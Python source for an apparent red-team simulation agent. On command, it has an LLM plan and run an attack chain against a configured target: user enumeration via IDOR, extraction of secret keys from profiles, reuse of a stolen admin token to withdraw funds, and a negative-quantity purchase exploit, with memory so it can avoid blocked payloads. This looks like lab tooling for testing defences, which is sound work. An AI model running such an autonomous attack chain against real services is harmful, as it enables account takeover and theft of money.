import requests
import json
import time
import datetime
import redis
from typing import List, Dict, Any

from shared.llm_core import ask_llm_json
from shared.schemas import ExploitEvent, AttackPayload
from shared.config import settings, get_logger
from shared.redis_client import publish_exploit

logger = get_logger("RED_AGENT")

def generate_system_prompt(knowledge_base: List[str]):
    kb_summary = "\n".join([f"- {item}" for item in knowledge_base]) if knowledge_base else "No prior data."
    
    return f"""
    You are an autonomous Red Team AI Agent with PERSISTENT MEMORY.
    
    KNOWLEDGE BASE (Past Lessons):
    {kb_summary}

    STRATEGY:
    - Step 1: Recon. Enumerate users via /users/{{id}}. 
    - Step 2: Data Theft. Extract secrets from profiles.
    - Step 3: Privilege Escalation. Use stolen keys to hit /admin/withdraw. 
      IMPORTANT: You MUST provide the token in the 'headers' object as {{"X-Admin-Token": "STOLEN_KEY"}} and a high 'quantity' in the payload (e.g., {{"quantity": 5000}}).
    - Step 4: Logic Flaws. Fallback to /buy endpoint. To steal money here, use a NEGATIVE 'quantity' (e.g., {{"item": "apple", "quantity": -500}}).

    LEARNING MODE:
    - Review the KNOWLEDGE BASE. If a payload was "Neutralized" or "Blocked", DO NOT repeat it.
    - If a token was invalid, check if the Blue Agent patched the profiling endpoint.
    - Be tactical. Adapt reasoning based on what failed before.
    """

def attack():
    r = redis.Redis(host=settings.REDIS_HOST, port=settings.REDIS_PORT, decode_responses=True)
    logger.info("📡 [PHASE: RECON] Starting autonomous campaign with Memory...")
    
    history = []
    MAX_STEPS = 6
    stolen_token = None

    # Track Start Time
    start_time = datetime.datetime.now().strftime("%H:%M:%S")
    r.hset("ATTACK_STATUS", mapping={"start": start_time, "end": "Running...", "status": "In Progress"})

    for step in range(MAX_STEPS):
        # Fetch latest Knowledge Base from Redis
        kb_red = r.lrange("KB_RED", 0, 4) # Top 5 lessons
        
        logger.info(f"--- Thought Cycle {step + 1}/{MAX_STEPS} ---")
        
        prompt = f"""
        CORE_CONTEXT:
        - HISTORY: {json.dumps(history[-2:], indent=2)}
        - TOKEN_FOUND: {stolen_token}
        
        DECISION MATRIX:
        - Need key? GET /users/{{id}} (ID 1-5).
        - Have key? POST /admin/withdraw.
        - Otherwise, POST /buy.
        - TACTICAL ADVICE: If the server returns 'Insufficient funds', LOWER your quantity (e.g., try 100 instead of 5000).

        Output JSON: {{"reasoning": "...", "action": "GET|POST", "url": "/endpoint", "payload": {{}}, "headers": {{}}}}
        """

        try:
            decision = ask_llm_json(system_prompt=generate_system_prompt(kb_red), user_prompt=prompt)
            reasoning = decision.get("reasoning", "Executing tactical maneuver.")
            action = decision.get("action")
            url = decision.get("url")
            payload = decision.get("payload", {})
            headers = decision.get("headers", {})
            
            logger.info(f"🧠 Reasoning: {reasoning}")

            if not url.startswith("http"):
                url = f"{settings.TARGET_URL}{url}"

            res_metadata = ""
            if action == "GET":
                res = requests.get(url, timeout=5)
                result = res.json()
                logger.info(f"🔭 Recon {url} Result: {result}")
                
                if "secret_key" in result:
                    stolen_token = result["secret_key"]
                    logger.critical(f"🔓 [LEAK] Extracted Admin Key: {stolen_token}")
                
                res_metadata = f"GET {url} returned {result}"
                history.append({"action": f"GET {url}", "response": result})
            
            else:
                logger.info(f"🔫 Deploying Payload to {url} | Payload: {payload} | Headers: {headers}")
                res = requests.post(url, json=payload, headers=headers, timeout=5)
                
                if res.status_code == 200:
                    logger.critical(f"💥 [IMPACT] Target Compromised! {res.json()}")
                    res_metadata = f"SUCCESS: POST {url} with payload {payload} worked!"
                    
                    event = ExploitEvent(
                        severity="Critical",
                        vulnerability_type="IDOR/Privilege Escalation" if "admin" in url else "Financial Logic",
                        target_endpoint=url,
                        payload=payload,
                        description=f"Persistent adaptive chain hit {url}"
                    )
                    publish_exploit(event.model_dump())
                    
                    # Store success lesson
                    r.lpush("KB_RED", f"SUCCESS: {url} exploited via {payload}")
                    
                    # Publish End Time (Success)
                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
                    r.hset("ATTACK_STATUS", mapping={"end": end_time, "status": "COMPROMISED"})
                    return
                else:
                    status_msg = f"BLOCKED: {url} failed with {res.status_code} ({res.text[:50]})"
                    logger.warning(f"⚠️ {status_msg}")
                    res_metadata = status_msg
                
                history.append({"action": f"POST {url}", "status": res.status_code})

            # Save lesson to Knowledge Base
            lesson = f"Action: {action} {url} -> Result: {res_metadata[:100]}"
            r.lpush("KB_RED", lesson)
            r.ltrim("KB_RED", 0, 19) # Keep last 20 lessons

        except Exception as e:
            logger.error(f"❌ Cycle Interrupt: {e}")

    # Publish End Time (Timeout/Failed)
    end_time_fail = datetime.datetime.now().strftime("%H:%M:%S")
    r.hset("ATTACK_STATUS", mapping={"end": end_time_fail, "status": "FINISHED"})

def listen_and_attack():
    r = redis.Redis(host=settings.REDIS_HOST, port=settings.REDIS_PORT, decode_responses=True)
    pubsub = r.pubsub()
    pubsub.subscribe("commands")
    logger.info("🔴 Red Agent online. Memory Active. Listening...")
    for message in pubsub.listen():
        if message['type'] == 'message' and message['data'] == "START_RED":
            attack()

if __name__ == "__main__":
    listen_and_attack()